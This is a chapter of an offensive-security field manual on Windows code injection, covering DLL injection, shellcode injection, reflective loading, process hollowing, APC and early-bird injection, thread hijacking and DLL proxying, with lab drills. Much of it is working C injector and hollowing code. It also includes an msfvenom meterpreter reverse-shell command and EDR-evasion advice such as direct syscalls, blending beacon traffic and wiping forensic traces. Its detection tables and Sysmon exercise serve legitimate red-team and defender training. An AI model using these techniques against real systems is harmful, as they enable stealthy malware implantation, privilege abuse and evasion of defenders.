# Chapter 10 — Code Injection: DLL, Shellcode & Process Hollowing

**VADER-RCE Field Manual**
**Prerequisite**: Ch01-08 (memory fundamentals, Windows internals, API basics)
**Drill**: DRILLS/10_code_injection/

---

## Why You Need This

You have code execution somewhere. A shell, a local access vector, a phishing
payload that ran. Now you need that code running somewhere ELSE — in a trusted
process, under a different token, persisting across sessions, invisible to
a cursory task manager glance.

Code injection is the bridge between "I have execution" and "I have the
right execution." Running your implant inside explorer.exe is different
from running it as a standalone process. Running inside lsass.exe is
different from running inside explorer.exe. The container matters.
The container determines the trust context, the network behaviour,
the privilege level, and the visibility to defenders.

This chapter is a toolkit. Each technique is a tool with specific use
cases, specific artefacts, and specific detection signatures. You pick
the right tool for the target environment. You understand what you leave
behind. You understand what the SOC analyst sees on the other side.

No technique in this chapter is magic. Every one leaves traces. Your
job is to understand those traces well enough to minimise them below
the detection threshold — or accept them when the operational window
is short enough that it doesn't matter.

---

## Section 1 — Classic DLL Injection

The grandfather of code injection. Four API calls. Works on every
Windows version that ever existed. Understood by every analyst and
every EDR on the planet. Use it when you need something that WORKS
and stealth is not the primary constraint.

### The Four-Call Chain

```
OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_pid)
    │
    ▼
VirtualAllocEx(proc_handle, NULL, path_len, MEM_COMMIT, PAGE_READWRITE)
    │
    ▼
WriteProcessMemory(proc_handle, remote_addr, dll_path, path_len, NULL)
    │
    ▼
CreateRemoteThread(proc_handle, NULL, 0, LoadLibraryA, remote_addr, 0, NULL)
```

LoadLibraryA is the thread start address. It lives in kernel32.dll which
is mapped at the SAME BASE ADDRESS in every process (ASLR does not
randomize kernel32 across process boundaries — only across reboots).
So you can take the address of LoadLibraryA in YOUR process and use
it in the remote CreateRemoteThread call.

### Implementation

```c
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

DWORD get_pid_by_name(const char *proc_name) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe = { sizeof(pe) };
    if (Process32First(snap, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, proc_name) == 0) {
                CloseHandle(snap);
                return pe.th32ProcessID;
            }
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);
    return 0;
}

int inject_dll(DWORD pid, const char *dll_path) {
    HANDLE proc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!proc) return 1;

    size_t path_len = strlen(dll_path) + 1;

    LPVOID remote_buf = VirtualAllocEx(
        proc, NULL, path_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
    );
    if (!remote_buf) { CloseHandle(proc); return 1; }

    WriteProcessMemory(proc, remote_buf, dll_path, path_len, NULL);

    HANDLE thread = CreateRemoteThread(
        proc, NULL, 0,
        (LPTHREAD_START_ROUTINE)GetProcAddress(
            GetModuleHandleA("kernel32.dll"), "LoadLibraryA"
        ),
        remote_buf, 0, NULL
    );
    if (!thread) { CloseHandle(proc); return 1; }

    WaitForSingleObject(thread, INFINITE);
    CloseHandle(thread);
    CloseHandle(proc);
    return 0;
}

int main(int argc, char **argv) {
    // inject_dll into explorer.exe
    DWORD pid = get_pid_by_name("explorer.exe");
    if (!pid) { printf("[-] target not found\n"); return 1; }
    printf("[*] injecting into PID %lu\n", pid);
    return inject_dll(pid, "C:\\Users\\Public\\payload.dll");
}
```

### Required Privileges

```
PROCESS_ALL_ACCESS is maximum rights. You can drop this to the
minimum set required:
    PROCESS_VM_WRITE      — WriteProcessMemory
    PROCESS_VM_OPERATION  — VirtualAllocEx
    PROCESS_CREATE_THREAD — CreateRemoteThread

Injecting into processes of EQUAL OR LOWER integrity level works
without special privileges.

Injecting into HIGHER integrity (e.g., from medium into high):
→ Requires SeDebugPrivilege
→ Enabled by default for admins, disabled by default for standard users
→ Enable it: AdjustTokenPrivileges()

Injecting into protected processes (PPL — Protected Process Light):
→ lsass.exe, antimalware services, etc.
→ Standard injection will fail with ACCESS_DENIED
→ Requires kernel-level access (driver) or PPL downgrade exploit
```

### Detection Artefacts

```
ARTEFACT                           DETECTION METHOD
─────────────────────────────────────────────────────
OpenProcess(ALL_ACCESS)            ETW: Microsoft-Windows-Kernel-Process
                                   Sysmon Event ID 10 (ProcessAccess)

VirtualAllocEx + WriteProcessMemory ETW: Microsoft-Windows-Kernel-Memory
                                    WPM on another process = red flag

CreateRemoteThread                  ETW: Microsoft-Windows-Kernel-Process
                                    Sysmon Event ID 8 (CreateRemoteThread)
                                    Thread start at LoadLibraryA = classic sig

DLL on disk at injected path        File system monitoring
                                    EDR file creation hooks
                                    Disk artefacts survive reboot

Loaded DLL in target process        Process memory scan (EDR)
                                    Module list vs known-good baseline
                                    DLL not in standard module list
```

Classic DLL injection is LOUD. Every EDR watches the exact API sequence.
If your threat model includes EDR, step up to a less visible technique.
If it doesn't (CTF, lab, unmonitored environment), classic injection works
fine and is much simpler to debug.

---

## Section 2 — Shellcode Injection

No DLL on disk. No LoadLibrary. Raw machine code written directly into
remote process memory and executed there. Reduces file system artefacts
to zero — the payload only exists in memory.

### The Core Pattern

```
VirtualAllocEx(proc, NULL, shellcode_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
    │
    ▼
WriteProcessMemory(proc, remote_buf, shellcode, shellcode_len, NULL)
    │
    ▼
CreateRemoteThread(proc, NULL, 0, remote_buf, NULL, 0, NULL)
```

The difference from DLL injection: remote_buf IS the thread start address.
Your shellcode is the function. No LoadLibrary needed. No DLL on disk.

### Shellcode Sources

```
msfvenom — Metasploit payload generation:
    msfvenom -p windows/x64/meterpreter/reverse_tcp \
        LHOST=10.0.0.1 LPORT=4444 \
        -f c > shellcode.h

    msfvenom -p windows/x64/exec CMD="calc.exe" \
        -f hex

donut — convert .NET/PE/shellcode to position-independent code:
    donut -f payload.exe -a 2 -o shellcode.bin

sRDI — convert DLL to shellcode (position-independent DLL):
    python ShellcodeRDI.py payload.dll
    → outputs raw PIC shellcode, no loader needed

Custom — write your own:
    NASM or MASM for raw ASM
    C compiled with -fPIC equivalent flags
    Must be position-independent (no absolute addresses)
    Must resolve all APIs dynamically at runtime
```

### Two-Stage Allocation (Stealth Improvement)

```c
// Stage 1: Allocate RW, write shellcode
LPVOID remote_buf = VirtualAllocEx(
    proc, NULL, shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
);
WriteProcessMemory(proc, remote_buf, shellcode, shellcode_len, NULL);

// Stage 2: Flip to RX (no RWX region — lower detection signal)
DWORD old_protect;
VirtualProtectEx(proc, remote_buf, shellcode_len, PAGE_EXECUTE_READ, &old_protect);

// Stage 3: Execute
CreateRemoteThread(proc, NULL, 0,
    (LPTHREAD_START_ROUTINE)remote_buf, NULL, 0, NULL
);
```

Why this matters: a RWX region (read + write + execute simultaneously) is
a major EDR red flag. Memory that was written and then made executable is
still suspicious — but less so than a region that was always RWX.

### Detection Artefacts

```
PAGE_EXECUTE_READWRITE regions in process memory  — memory scanner
Shellcode signatures in memory                    — YARA signatures via EDR
Suspicious thread start address                   — not in any module's .text
CreateRemoteThread                                — Sysmon Event ID 8
VirtualProtectEx call                             — ETW kernel memory events
```

The big win over classic DLL injection: no file on disk. The downside:
shellcode has no persistence mechanism built in. If the process dies,
the shellcode dies with it. DLLs can run DllMain on attach, have export
tables, and are trivially loadable again. Shellcode is single-shot.

---

## Section 3 — Reflective DLL Injection

A DLL that loads ITSELF into memory without calling LoadLibrary and
without appearing in the target's module list. The DLL contains its own
miniature PE loader as an exported function. That function resolves
imports, applies relocations, and maps the DLL sections — all from within
the target process's address space.

This is the technique powering Meterpreter's `migrate` and Cobalt
Strike's `inject` command.

### How It Works

```
Traditional DLL injection:
    Injector → calls LoadLibraryA in target → Windows loader loads DLL
    → DLL appears in PEB.Ldr module list → EDR sees new module

Reflective DLL injection:
    Injector → copies raw DLL bytes into target memory
            → calls ReflectiveLoader() export at offset within those bytes
    → ReflectiveLoader():
        1. Finds its own base address (walks backward from return address)
        2. Parses its own PE headers (IMAGE_NT_HEADERS, sections, imports)
        3. Allocates new memory: VirtualAlloc(preferred_size, MEM_COMMIT, RWX)
        4. Copies each section to the new allocation
        5. Applies base relocations (fixes absolute addresses)
        6. Resolves all imports by walking PEB module list for kernel32/ntdll
        7. Calls DllMain(DLL_PROCESS_ATTACH)
    → DLL is running but NOT in the module list (never called LdrLoadDll)
```

### Using sRDI (Shellcode Reflective DLL Injection)

```bash
# Convert existing DLL to shellcode (includes its own loader)
git clone https://github.com/monoxgas/sRDI
cd sRDI

python3 ShellcodeRDI.py payload.dll

# Output: payload.bin — raw position-independent shellcode
# Inject this exactly like shellcode (Section 2)
# No trace in module list
# No file on disk
```

### Writing Your Own ReflectiveLoader

The core logic in pseudocode:

```c
// This function is exported as "ReflectiveLoader"
// It receives no arguments — must find its own location
ULONG_PTR WINAPI ReflectiveLoader(void) {

    // Step 1: Find our own base address
    // Walk backward from RIP until we hit the MZ signature
    ULONG_PTR rip;
    __asm__ __volatile__("lea %0, [rip]" : "=r"(rip));
    ULONG_PTR base = rip;
    while (*(WORD*)base != 0x5A4D) base--;  // 'MZ'

    // Step 2: Parse PE headers
    IMAGE_NT_HEADERS *nt = (void*)(base + *(DWORD*)(base + 0x3C));
    IMAGE_SECTION_HEADER *sections = IMAGE_FIRST_SECTION(nt);

    // Step 3: Allocate new home
    ULONG_PTR new_base = (ULONG_PTR)VirtualAlloc(
        (void*)nt->OptionalHeader.ImageBase,
        nt->OptionalHeader.SizeOfImage,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
    );

    // Step 4: Copy headers + sections
    memcpy((void*)new_base, (void*)base, nt->OptionalHeader.SizeOfHeaders);
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        memcpy(
            (void*)(new_base + sections[i].VirtualAddress),
            (void*)(base + sections[i].PointerToRawData),
            sections[i].SizeOfRawData
        );
    }

    // Step 5: Base relocations
    ULONG_PTR delta = new_base - nt->OptionalHeader.ImageBase;
    // ... walk IMAGE_DIRECTORY_ENTRY_BASERELOC, apply delta to each entry

    // Step 6: Resolve imports
    // Walk IMAGE_DIRECTORY_ENTRY_IMPORT
    // Find each DLL in PEB.Ldr by name hash (avoid GetModuleHandle string)
    // Find each function by walking export directory
    // Write resolved addresses into IAT

    // Step 7: Execute
    DllEntryPoint = (BOOL(WINAPI*)(HINSTANCE,DWORD,LPVOID))(
        new_base + nt->OptionalHeader.AddressOfEntryPoint
    );
    DllEntryPoint((HINSTANCE)new_base, DLL_PROCESS_ATTACH, NULL);

    return new_base;
}
```

### Detection Artefacts

```
Not in PEB module list                — breaks module enumeration tools
                                        Detected by: !lmi in WinDbg, memory scanners
Memory with RWX permissions           — VirtualAlloc RWX flag
                                        Detected by: Process Hacker, memory scanners
PE headers in non-module memory       — YARA: MZ+PE signature in heap
                                        Detected by: EDR memory scanning
Private memory with executable code   — anomaly vs normal DLL-mapped regions
                                        Detected by: VAD (Virtual Address Descriptor)
                                        analysis — no corresponding file mapping
```

The absence from the module list is both the advantage and a detection
signal. Normal processes have executable memory only in mapped modules.
A region that's executable but has no mapped file backing it is anomalous.
Defenders know this. Memory forensics tools (Volatility `malfind`) hunt
for exactly this pattern.

---

## Section 4 — Process Hollowing

Create a legitimate process in suspended state. Hollow out its code.
Fill it with your payload. Resume execution. The process looks like
a legitimate binary from the outside — same path, same PID lineage,
same image name — but runs your code.

### The Sequence

```
CreateProcess(target_exe, ..., CREATE_SUSPENDED, ...)
    │
    ▼
Read PEB to find ImageBase (NtQueryInformationProcess or manual PEB walk)
    │
    ▼
NtUnmapViewOfSection(proc_handle, image_base)  — hollow out the original image
    │
    ▼
VirtualAllocEx(proc_handle, preferred_base, payload_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
    │
    ▼
WriteProcessMemory(proc_handle, new_base, payload_pe_headers)
WriteProcessMemory(proc_handle, new_base + section.VirtualAddress, payload_section_data)
    ... (for each section)
    │
    ▼
SetThreadContext(main_thread, ...) — set RIP to new entry point
    │
    ▼
ResumeThread(main_thread)
```

### Implementation

```c
#include <windows.h>
#include <winternl.h>

// Function pointer for NtUnmapViewOfSection (undocumented, in ntdll.dll)
typedef NTSTATUS (WINAPI *pfnNtUnmapViewOfSection)(HANDLE, PVOID);

void hollow_process(const char *target_path, BYTE *payload, DWORD payload_size) {
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;

    // Step 1: Create target process suspended
    if (!CreateProcessA(target_path, NULL, NULL, NULL, FALSE,
                        CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        return;
    }

    // Step 2: Get ImageBase from PEB
    PROCESS_BASIC_INFORMATION pbi;
    NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation,
                              &pbi, sizeof(pbi), NULL);

    PVOID peb_image_base_addr = (PBYTE)pbi.PebBaseAddress + 0x10;
    PVOID image_base;
    ReadProcessMemory(pi.hProcess, peb_image_base_addr,
                      &image_base, sizeof(image_base), NULL);

    // Step 3: Unmap the original image
    pfnNtUnmapViewOfSection NtUnmap =
        (pfnNtUnmapViewOfSection)GetProcAddress(
            GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection"
        );
    NtUnmap(pi.hProcess, image_base);

    // Step 4: Parse payload PE headers
    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS*)(payload + *(DWORD*)(payload + 0x3C));
    DWORD payload_img_size = nt->OptionalHeader.SizeOfImage;
    PVOID preferred_base = (PVOID)(ULONG_PTR)nt->OptionalHeader.ImageBase;

    // Step 5: Allocate space in target
    PVOID new_base = VirtualAllocEx(
        pi.hProcess, preferred_base, payload_img_size,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
    );

    // Step 6: Write payload PE headers
    WriteProcessMemory(pi.hProcess, new_base, payload,
                       nt->OptionalHeader.SizeOfHeaders, NULL);

    // Step 7: Write each section
    IMAGE_SECTION_HEADER *sections = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        PVOID dest = (PBYTE)new_base + sections[i].VirtualAddress;
        PVOID src  = payload + sections[i].PointerToRawData;
        WriteProcessMemory(pi.hProcess, dest, src,
                           sections[i].SizeOfRawData, NULL);
    }

    // Step 8: Update PEB.ImageBase to point to new base
    WriteProcessMemory(pi.hProcess, peb_image_base_addr,
                       &new_base, sizeof(new_base), NULL);

    // Step 9: Set entry point via thread context
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, &ctx);
    ctx.Rcx = (DWORD64)((PBYTE)new_base + nt->OptionalHeader.AddressOfEntryPoint);
    SetThreadContext(pi.hThread, &ctx);

    // Step 10: Resume
    ResumeThread(pi.hThread);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
}
```

### Choosing The Target Binary

```
GOOD TARGETS (common, trusted, network-connected):
    svchost.exe         — runs hundreds of instances, blends perfectly
    explorer.exe        — user-context, network access
    notepad.exe         — simple, stable, rarely scrutinized
    msiexec.exe         — legitimately makes network calls
    regsvr32.exe        — bypasses AppLocker in some configs

BAD TARGETS:
    lsass.exe           — protected process, injection fails
    System              — not a normal PE, will crash immediately
    Anything with PPL   — protected process light, Access Denied
```

### Detection Artefacts

```
Process image path ≠ actual code running     — PE header in memory ≠ file on disk
                                               Detected by: memory forensics,
                                               EDR code integrity checks

NtUnmapViewOfSection on own image            — unusual API call
                                               Detected by: ETW, API hooking

PAGE_EXECUTE_READWRITE on entire image       — normal images use mixed page perms
                                               Detected by: memory scanners

PEB.ImageBase ≠ mapped file backing         — discrepancy in VAD tree
                                               Detected by: Volatility dlllist vs
                                               malfind comparison

Suspended thread RIP set manually           — SetThreadContext before resume
                                               Detected by: Sysmon Event ID 8
                                               (thread injection), EDR hooks
```

---

## Section 5 — APC Injection

Asynchronous Procedure Calls. Every thread has an APC queue. When a
thread enters an alertable wait state, it drains the queue and executes
each entry. You queue your shellcode as an APC. The thread runs it
when it next enters an alertable wait.

### The Sequence

```
OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_pid)
    │
    ▼
VirtualAllocEx + WriteProcessMemory (same as shellcode injection)
    │
    ▼
OpenThread(THREAD_SET_CONTEXT, FALSE, target_tid)
    │
    ▼
QueueUserAPC(shellcode_addr, target_thread, 0)
    │
    ▼
Wait for thread to enter alertable state (SleepEx, WaitForSingleObjectEx, etc.)
    │
    ▼
Shellcode executes in context of target thread
```

### Thread Selection

Not all threads enter alertable states. You need to find one that does.

```c
// Enumerate threads of target process
HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
THREADENTRY32 te = { sizeof(te) };
DWORD target_pid = ...; // your target

if (Thread32First(snap, &te)) {
    do {
        if (te.th32OwnerProcessID == target_pid) {
            // Queue APC to every thread — at least one will be alertable
            HANDLE thread = OpenThread(THREAD_SET_CONTEXT, FALSE, te.th32ThreadID);
            if (thread) {
                QueueUserAPC(
                    (PAPCFUNC)shellcode_remote_addr,
                    thread,
                    0
                );
                CloseHandle(thread);
            }
        }
    } while (Thread32Next(snap, &te));
}
```

Queuing to ALL threads of the target increases the chance one is in an
alertable wait when you queue. This is noisy but reliable.

### Early-Bird APC Injection

The stealth variant. Create the target process SUSPENDED. Queue an APC
before the process has run a single instruction. When the main thread
initialises and calls NtTestAlert() as part of its startup sequence,
it drains the APC queue — YOUR code runs BEFORE the process's own code.
This means the EDR has had zero opportunity to observe the process, hook
its APIs, or baseline its state.

```c
// Create process suspended
CreateProcessA(target, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED,
               NULL, NULL, &si, &pi);

// Alloc + write shellcode BEFORE the process runs anything
LPVOID remote_buf = VirtualAllocEx(
    pi.hProcess, NULL, shellcode_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE
);
WriteProcessMemory(pi.hProcess, remote_buf, shellcode, shellcode_len, NULL);

// Queue APC to the main thread (still suspended)
QueueUserAPC((PAPCFUNC)remote_buf, pi.hThread, 0);

// Resume — first thing main thread does is drain APC queue
ResumeThread(pi.hThread);
```

Early-bird is cleaner than standard APC injection because:
- Process is brand new — no EDR hooks yet if userland hooks are the detection method
- APC runs before process initialization completes — no behavioral baseline yet
- No thread enumeration needed — you control the main thread

### Detection Artefacts

```
QueueUserAPC                          — ETW: thread APC events
                                        Sysmon: limited visibility here
                                        Most EDRs do NOT flag QueueUserAPC alone

APC target in non-module memory       — Detected if EDR inspects APC queue contents
                                        Uncommon but possible in mature EDRs

Early-bird: VirtualAllocEx on brand   — Same artefacts as shellcode injection
new process before it runs            — Pattern: CreateProcess(SUSPENDED) +
                                        VirtualAllocEx + QueueUserAPC + Resume
                                        = strong signal for mature EDRs
```

---

## Section 6 — Thread Hijacking

No new thread. No APC queue. Take a running thread, freeze it, redirect
its execution pointer, let it run your code, restore it.

### The Sequence

```
SuspendThread(target_thread)
    │
    ▼
GetThreadContext(target_thread, &ctx)
    │
    ▼
// Write shellcode somewhere in target process
VirtualAllocEx + WriteProcessMemory
    │
    ▼
// Modify RIP to point at shellcode
ctx.Rip = shellcode_remote_addr;
// Optionally: save original RIP on stack for shellcode to return to
*(DWORD64*)(ctx.Rsp - 8) = ctx.Rip; ctx.Rsp -= 8;  // push original RIP
    │
    ▼
SetThreadContext(target_thread, &ctx)
    │
    ▼
ResumeThread(target_thread)
```

### Caveats

```
Race condition: between SuspendThread and GetThreadContext, the thread
might be in a critical section or holding a mutex. If you redirect it
mid-critical-section, the target process may deadlock or crash.

Safe redirect points:
    Thread waiting on an event (WAIT_OBJECT_0)
    Thread sleeping (SleepEx)
    Thread blocked on I/O
    WaitForSingleObject in the GetMessage pump (GUI threads)

Danger zones:
    Thread holding a heap lock — heap operations will deadlock
    Thread inside ntdll loader lock — module loads will deadlock
    Thread in kernel transition — undefined behavior

Shellcode must preserve and restore all registers and stack alignment.
Treat it like a signal handler — you interrupted arbitrary code, you
must leave zero trace when you're done.
```

---

## Section 7 — Atom Bombing

An esoteric technique using the Windows Global Atom Table as a covert
data channel. Predates modern EDRs, largely detected now but instructive
for understanding creative injection paths.

### The Concept

```
1. Store shellcode as atoms in the global atom table:
   AddAtom() stores strings globally — any process can retrieve them

2. Target an alertable thread with NtSetContextThread
   (or QueueUserAPC) to call GlobalGetAtomName into its stack

3. Multiple APC calls reconstruct the shellcode on the target stack

4. Final APC calls NtProtectVirtualMemory to make the stack executable

5. Final APC calls the shellcode address (now on target stack)
```

```c
// Example: store shellcode bytes as atom names
ATOM atoms[64];
for (int i = 0; i < chunk_count; i++) {
    // Pack shellcode chunk into null-padded string
    wchar_t atom_name[256] = {0};
    memcpy(atom_name, shellcode + (i * CHUNK_SIZE), CHUNK_SIZE);
    atoms[i] = GlobalAddAtomW(atom_name);
}

// Queue APCs to reconstruct shellcode in target process
// Each APC calls GlobalGetAtomName with a stack offset
// This writes shellcode bytes onto the target thread's stack
```

This technique is academic at this point. Modern EDRs flag the unusual
atom table usage patterns. Include it in your understanding of the
creative design space — the PRINCIPLE (using legitimate Windows IPC
as a covert channel) is more valuable than the specific implementation.

---

## Section 8 — DLL Proxying

Not injection in the traditional sense — no OpenProcess, no remote
thread. DLL proxying is about REPLACEMENT. You substitute a malicious
DLL for a legitimate one. The malicious DLL forwards all calls to the
real DLL (hence "proxy") while executing additional code.

### The Concept

```
Normal load order:
    Application → imports WINHTTP.dll → loads from System32

Hijacked load order:
    Application → imports WINHTTP.dll
              → Windows searches application directory FIRST
              → finds your malicious winhttp.dll there
              → loads it
              → your DLL loads the real winhttp.dll from System32
              → forwards all function calls transparently
              → also runs your payload
```

### Creating A Proxy DLL

Tools: SharpDLLProxy, DLL-Proxy-Generator, or manual DEF file approach.

```
// Step 1: Identify the target DLL
// Find a DLL that the application imports (use PE-bear or dumpbin)
dumpbin /imports target_app.exe

// Step 2: Export all functions from the real DLL as forwards
// .DEF file approach — each line forwards to the real DLL:
// EXPORTS
//   HttpOpenRequestW = C:\Windows\System32\winhttp.HttpOpenRequestW @1
//   ...

// Automated: DLL-Proxy-Generator
python generate.py -d C:\Windows\System32\winhttp.dll
// Outputs: winhttp_proxy.cpp + winhttp.def
// Add your payload to DllMain or any exported function
```

```c
// DllMain in your proxy DLL
BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpvReserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        // Run payload code here
        CreateThread(NULL, 0, payload_thread, NULL, 0, NULL);
    }
    return TRUE;
}
```

### Hijack Search Order Targets

```
DLL search order (simplified, SafeDllSearchMode disabled):
    1. Application directory (EXE's folder)
    2. Current working directory
    3. System32
    4. System
    5. Windows directory
    6. PATH

High-value targets (commonly missing from application directories):
    winhttp.dll     — tons of apps import it
    version.dll     — almost universally imported by older apps
    dbghelp.dll     — debugging apps
    uxtheme.dll     — GUI applications
    wtsapi32.dll    — terminal services-aware apps

Identify missing DLLs: Process Monitor → filter for "NAME NOT FOUND" + "dll"
```

### Detection Artefacts

```
DLL loaded from unusual path         — module path ≠ System32/SysWOW64
                                       Detected by: EDR module load monitoring
                                       Sysmon Event ID 7 (ImageLoad) with path check

DLL without valid signature          — legitimate system DLLs are MS-signed
                                       Detected by: code signing validation
                                       Can be bypassed if app doesn't enforce signing

DLL with both unexpected exports     — proxy DLL has all legit exports PLUS extras
AND DllMain payload                   Detected by: static analysis of the DLL
```

---

## Section 9 — Detection Artefacts Consolidated

Everything in this chapter produces observable signals. Know what
you generate. Choose your technique based on the detection environment.

```
TECHNIQUE              KEY ARTEFACT                    PRIMARY DETECTOR
──────────────────────────────────────────────────────────────────────────
Classic DLL inject    CreateRemoteThread               Sysmon Event 8
                      DLL file on disk                 File monitoring, EDR

Shellcode inject      RWX memory in target             Memory scanner
                      Thread start in non-module       ETW memory events

Reflective DLL        Non-module executable memory     Volatility malfind
                      PE headers in heap               YARA memory scan

Process hollowing     Image ≠ file on disk             EDR code integrity
                      NtUnmapViewOfSection             ETW API monitoring

APC injection         QueueUserAPC                     ETW (limited)
                      Non-module APC target            Mature EDR hooks

Early-bird APC        Suspended process + VirtualAlloc  EDR behavioral pattern
                      + APC + Resume sequence

Thread hijacking      SetThreadContext on foreign       ETW, EDR thread hooks
                      thread, RIP modification

Atom bombing          Unusual GlobalAtom API use        EDR behavioral analysis

DLL proxying          DLL loaded from wrong path        Sysmon Event 7 + path
                      Unsigned DLL                     Code signing checks
```

### Minimising Artefacts

```
General principles:
1. Prefer syscalls over Win32 API
   — EDR hooks WinAPI functions, not raw syscalls
   — Use SysWhispers or HellsGate to make direct syscalls
   — NtAllocateVirtualMemory instead of VirtualAllocEx
   — NtWriteVirtualMemory instead of WriteProcessMemory
   — NtCreateThreadEx instead of CreateRemoteThread

2. Avoid RWX memory
   — Allocate RW, write, flip to RX with separate VirtualProtect call
   — Some advanced techniques avoid ever having executable+writable

3. Prefer existing threads over new ones
   — CreateRemoteThread is loud
   — APC injection, thread hijacking, and SetWindowsHookEx avoid it

4. Choose target processes carefully
   — Inject into processes that legitimately make network connections
   — Match the beacon callback behavior to the host process's normal traffic
   — svchost.exe calling out to a random IP is suspicious
   — chrome.exe calling out to an IP is less suspicious

5. Clean up
   — Free remote allocations when done if possible
   — Zero memory before freeing to eliminate forensic content
   — Remove injected DLL from target's module list if using reflective technique
```

---

## Key Terms

| Term | Definition |
|------|-----------|
| **DLL injection** | Writing a DLL path into a remote process and calling LoadLibrary via a remote thread |
| **Shellcode injection** | Writing raw machine code into remote process memory and executing it directly |
| **Reflective DLL injection** | Self-loading DLL that maps itself without calling LoadLibrary; never appears in module list |
| **Process hollowing** | Creating a suspended legitimate process, replacing its code with payload code, resuming |
| **APC injection** | Queuing shellcode execution via the thread APC mechanism; runs when thread enters alertable state |
| **Early-bird APC** | Queuing APC to a newly-created suspended process before it runs any code |
| **Thread hijacking** | Suspending a running thread, modifying its RIP, and resuming it to run your code |
| **Atom bombing** | Using the Global Atom Table as a covert data channel to transfer shellcode |
| **DLL proxying** | Replacing a legitimate DLL with one that forwards all calls to the real DLL plus runs payload |
| **DLL search order hijacking** | Placing a malicious DLL in a location earlier in the search order than the legitimate one |
| **VAD (Virtual Address Descriptor)** | Kernel data structure tracking virtual memory regions; non-module executable regions are anomalous |
| **PEB (Process Environment Block)** | Per-process structure in user space containing ImageBase, module list, heap info |
| **AlertableWait** | Kernel state entered by SleepEx, WaitForSingleObjectEx — required for APC execution |
| **NtUnmapViewOfSection** | Undocumented ntdll export used to unmap a section from a process; central to process hollowing |
| **ETW (Event Tracing for Windows)** | High-speed kernel telemetry framework; source of most EDR observability |

---

## Drill 10 — Code Injection

Go to `DRILLS/10_code_injection/`. A target process is running. Tools and
a test DLL payload are provided.

Your missions:

1. **Classic DLL injection**: Inject `payload.dll` into `target.exe` using
   the four-call chain. Verify with Process Hacker — check the module list.

2. **Shellcode injection**: Use the provided calc-spawning shellcode. Inject
   via VirtualAllocEx + WriteProcessMemory + CreateRemoteThread. Verify
   calc.exe spawns as child of target.

3. **Reflective DLL**: Inject `reflective_payload.dll` using sRDI output.
   Verify it does NOT appear in target's module list (check Process Hacker,
   WinDbg `lm`, and `!dlls`).

4. **Process hollowing**: Hollow notepad.exe with the provided payload binary.
   Verify via Process Hacker memory map — the PE headers should not match
   notepad.exe on disk.

5. **Early-bird APC**: Spawn svchost.exe suspended, inject shellcode via
   early-bird, resume. Shellcode must execute BEFORE svchost's own code.
   Verify with WinDbg: break on process start, check APC queue state.

6. **Detection exercise**: Run each technique and capture Sysmon logs.
   Document which Event IDs fire for each technique. Map each artefact
   to the consolidated table in Section 9.

The goal of step 6 is as important as the injection itself. You must
understand what the defender sees. If you don't know the artefact,
you can't suppress it.

---

— cold steel forged in memory,
every THREAD a wire drawn through someone else's house

